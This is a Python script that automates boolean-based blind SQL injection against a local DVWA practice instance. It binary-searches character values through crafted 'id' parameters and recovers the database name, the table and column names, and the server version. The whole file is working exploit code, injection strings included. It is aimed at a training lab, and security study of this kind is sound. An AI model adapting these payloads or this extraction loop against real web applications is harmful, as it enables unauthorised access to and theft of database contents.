# DVWA Blind SQLi script

from pwn import *
import requests
import re
from itertools import cycle
import logging

url = 'http://127.0.0.1/dvwa/vulnerabilities/sqli_blind'
fixed_query = "?Submit=Submit&id=1"
cookies = {
    'security': 'low',
    'PHPSESSID': 'tskdd1ij8vplnbc7hnlcdpap4p'
}
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'


def sql_inject(sqli_pt1, variable, sqli_pt2):
    # Build up URL and execute SQLi
    next_url = url + fixed_query + sqli_pt1 + variable + sqli_pt2
    debug("Testing " + variable + " on \"" + next_url + "\"")
    return requests.get(next_url, cookies=cookies)


def guess_len(guess_type, sqli_pt1, sqli_pt2):
    # Guess length of DB name, table count etc
    for i in range(1, 100):
        # Submit SQLi string
        response = sql_inject(sqli_pt1, str(i), sqli_pt2)
        # Extract the response we're interested in
        error_message = re.search(r'User.*\.', response.text).group(0)
        debug(error_message)
        # If we've found the DB name length, return
        if "MISSING" not in error_message:
            success(guess_type + str(i) + '\n\n')
            return i


def guess_name(guess_type, sqli_pt1, sqli_pt2, name_len, min_char_initial, max_char_initial):
    name = ""
    for i in range(1, name_len + 1):
        # Need to reset all these after we find each char
        found_next_char = 0
        min_char = min_char_initial
        max_char = max_char_initial
        current_char = int((min_char + max_char) / 2)  # start half way through alphabet ('m')
        # Should we check greater than or less than?
        comparison_types = cycle(['<', '>'])
        comparison = next(comparison_types)

        while(found_next_char != 2):
            # Submit SQLi string ('i' used for substring index, 'current_char' used for finding next char in name)
            response = sql_inject(sqli_pt1 + str(i) + "," + str(i) + "))" + comparison, str(current_char), sqli_pt2)
            # Extract the response we're interested in
            error_message = re.search(r'User.*\.', response.text).group(0)
            debug(error_message)

            # If ID shows "exists" then condition is true e.g. char > 97
            if "MISSING" not in error_message:
                # Reset our found_next_char counter
                found_next_char = 0
                # Next char is greater than the char we just tested
                if comparison == '>':
                    min_char = current_char
                # Otherwise, next char is lower than the one we just tested
                else:
                    max_char = current_char
                # Reset the current char to test value
                current_char = int((min_char + max_char) / 2)
            # If ID shows "MISSING" then condition is false e.g. !(char > 97)
            else:
                # Reverse the comparison check
                comparison = next(comparison_types)
                # Once this hit '2' in a row we know we've got the right value
                found_next_char += 1

        # We found our char
        name += chr(current_char)
        info("Found char(" + str(i) + "): " + chr(current_char))
    # We got the whole DB name
    success(guess_type + name + '\n\n')
    return name


# Bullet-based SQLi
# Get the length of DB name first (pass in print output + SQLi pt1/pt2)
db_name_len = guess_len("DB Name Length: ", "'+and+length(database())+=", "+%23")

# Get the DB name
db_name = guess_name("DB Name: ", "'+and+ascii(substr(database(),", "+%23", db_name_len, ord('a'), ord('z'))

# Get number of tables in the DB
db_table_count = guess_len(
    "DB Table Count: ",
    "'+and+(select+count(*)+from+information_schema.tables+where+table_schema=database())+=", "+%23")

# Dump the tables
for table_no in range(db_table_count):
    # Get length of table name
    table_name_len = guess_len(
        "Table Name Length: ",
        "'+and+length(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1+offset+" + str(table_no) + "),1))+=",
        "+%23")
    # Guess table name
    table_name = guess_name(
        "Table Name: ",
        "'+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1+offset+" + str(table_no) + "),",
        "+%23",
        table_name_len, ord('a'), ord('z'))
    # Guess the field count
    table_field_count = guess_len(
        "Table Field Count: ",
        "'+and+(select+count(column_name)+from+information_schema.columns+where+table_name='" + table_name + "')+=", "+%23")

    # Now same process for field names (guess 'em)
    for field_no in range(table_field_count):
        # Guess length of field name
        field_name_len = guess_len(
            "Field Name Length: ",
            "'+and+length(substr((select+column_name+from+information_schema.columns+where+table_name='" +
            table_name + "'+limit+1+offset+" + str(field_no) + "),1))+=",
            "+%23")
        # Guess field name
        field_name = guess_name(
            "Field Name: ",
            "'+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='" +
            table_name + "'+limit+1+offset+" + str(field_no) + "),",
            "+%23",
            field_name_len, ord(' '), ord('z'))

    # TODO: continue same process to extract field data


# Finally, do our actual mission (get DB version)
db_version_name_len = guess_len("DB Version Length: ", "'+and+length(@@version)+=", "+%23")
# Here we check special chars, 0-9, A-Z, a-z etc
db_version_name = guess_name("DB Version: ", "'+and+ascii(substr(@@version,", "+%23", db_version_name_len, ord(' '), ord('z'))
